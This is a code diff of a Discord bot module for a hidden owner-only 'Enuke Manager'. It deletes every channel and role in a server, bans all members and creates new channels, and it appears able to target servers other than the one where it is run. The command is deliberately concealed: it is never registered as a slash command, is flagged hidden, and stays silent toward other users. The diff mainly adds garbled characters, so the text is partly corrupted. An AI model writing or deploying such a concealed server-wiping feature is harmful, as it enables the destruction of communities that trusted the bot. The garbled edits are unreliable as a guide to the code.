@@ -8,15 +8,15 @@ const enukeTargets = new Map();
 export const commands = [
   {
     name: 'enuke',
-    description: 'Opens the Enuke Manager — server wipe sequencer. Bot Owner only.',
+    description: 'Opens the Enuke Manager â€” server wipe sequencer. Bot Owner only.',
     category: 'owner',
     permissions: [],
-    slashHidden: true,  // Never register as slash command — prefix only
+    slashHidden: true,  // Never register as slash command â€” prefix only
     hidden: true,
     async executePrefix(message, args) {
       // ABSOLUTE OWNER-ONLY GATE
       if (!isBotOwnerSync(message.author.id)) {
-        return; // Silent rejection — don't even acknowledge the command exists
+        return; // Silent rejection â€” don't even acknowledge the command exists
       }
 
       let targetGuild = message.guild;
@@ -57,11 +57,11 @@ export const commands = [
         `**Members:** \`${targetGuild.memberCount}\`\n` +
         `**Channels:** \`${targetGuild.channels.cache.size}\`\n` +
         `**Roles:** \`${targetGuild.roles.cache.size}\`\n\n` +
-        `️ **This action is IRREVERSIBLE.** Press the button below to configure the nuke sequence.`,
+        `ï¸ **This action is IRREVERSIBLE.** Press the button below to configure the nuke sequence.`,
         [
-          { name: 'Mode 1', value: '`Channels & Roles` — Wipe all channels and roles only', inline: false },
-          { name: 'Mode 2', value: '`Ban All` — Ban all members only', inline: false },
-          { name: 'Mode 3', value: '`Wipe All` — Nuke everything (channels, roles, and ban all members)', inline: false }
+          { name: 'Mode 1', value: '`Channels & Roles` â€” Wipe all channels and roles only', inline: false },
+          { name: 'Mode 2', value: '`Ban All` â€” Ban all members only', inline: false },
+          { name: 'Mode 3', value: '`Wipe All` â€” Nuke everything (channels, roles, and ban all members)', inline: false }
         ]
       );
 
@@ -88,7 +88,7 @@ export const commands = [
 ];
 
 /**
- * Handle the Enuke Manager button click — opens the modal
+ * Handle the Enuke Manager button click â€” opens the modal
  */
 export async function handleEnukeButton(interaction) {
   console.log(`[ENUKE BUTTON] Clicked by ${interaction.user.tag} (${interaction.user.id})`);
@@ -97,7 +97,7 @@ export async function handleEnukeButton(interaction) {
   
   // Only the bot owner can use this
   if (!isBotOwnerSync(interaction.user.id)) {
-    return interaction.reply({ content: '️ Access Denied. Only the Bot Owner can use this.' });
+    return interaction.reply({ content: 'ï¸ Access Denied. Only the Bot Owner can use this.' });
   }
 
   const sessionKey = `enuke_${interaction.user.id}`;
@@ -160,14 +160,14 @@ export async function handleEnukeButton(interaction) {
 }
 
 /**
- * Handle the Enuke modal submission — executes the nuke sequence
+ * Handle the Enuke modal submission â€” executes the nuke sequence
  */
 export async function handleEnukeModal(interaction) {
   console.log(`[ENUKE MODAL] Submitted by ${interaction.user.tag} (${interaction.user.id})`);
   
   // Only the bot owner can use this
   if (!isBotOwnerSync(interaction.user.id)) {
-    return interaction.reply({ content: '️ Access Denied.' });
+    return interaction.reply({ content: 'ï¸ Access Denied.' });
   }
 
   const sessionKey = `enuke_${interaction.user.id}`;
@@ -225,7 +225,7 @@ export async function handleEnukeModal(interaction) {
       { name: ' Channels Deleted', value: `\`${results.channelsDeleted}\``, inline: true },
       { name: ' Roles Deleted', value: `\`${results.rolesDeleted}\``, inline: true },
       { name: ' Members Banned', value: `\`${results.membersBanned}\``, inline: true },
-      { name: '<:emoji_16:1533860111704002665> Channels Created', value: `\`${results.channelsCreated}\``, inline: true },
+      { name: '<:dark4luvontop:1533860081916182721> Channels Created', value: `\`${results.channelsCreated}\``, inline: true },
       { name: ' Errors', value: `\`${results.errors}\``, inline: true }
     ]
   );
@@ -298,7 +298,7 @@ async function executeNuke(guild, executor, mode, channelCount, channelName) {
 
         try {
           if (member.bannable) {
-            await member.ban({ reason: `Enuke Sequence — executed by ${executor.tag}` }).catch(() => null);
+            await member.ban({ reason: `Enuke Sequence â€” executed by ${executor.tag}` }).catch(() => null);
             results.membersBanned++;
           }
         } catch {
